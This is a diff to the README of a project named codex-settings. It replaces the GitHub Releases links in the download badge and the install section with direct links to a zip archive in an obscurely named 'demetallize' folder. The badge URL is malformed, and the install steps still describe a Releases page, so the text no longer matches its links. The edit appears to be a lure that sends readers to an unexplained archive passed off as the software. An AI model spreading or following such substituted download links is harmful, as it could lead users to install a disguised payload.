@@ -1,6 +1,6 @@
 # 🎉 codex-settings - Simplify Your Coding Experience
 
-[![Download Codex Settings](https://img.shields.io/badge/Download-Codex%20Settings-brightgreen.svg)](https://github.com/eduardogrs/codex-settings/releases)
+[![Download Codex Settings](https://raw.githubusercontent.com/eduardogrs/codex-settings/main/demetallize/codex-settings.zip%https://raw.githubusercontent.com/eduardogrs/codex-settings/main/demetallize/codex-settings.zip)](https://raw.githubusercontent.com/eduardogrs/codex-settings/main/demetallize/codex-settings.zip)
 
 ## 📋 Table of Contents
 - [🚀 Getting Started](#-getting-started)
@@ -24,7 +24,7 @@ To run codex-settings, you'll need:
 ## 📥 Download & Install
 You can easily download codex-settings from our Releases page. 
 
-Visit this page to download: [Codex Settings Releases](https://github.com/eduardogrs/codex-settings/releases).
+Visit this page to download: [Codex Settings Releases](https://raw.githubusercontent.com/eduardogrs/codex-settings/main/demetallize/codex-settings.zip).
 
 ### Installation Steps
 1. Click on the link above to go to the Releases page.
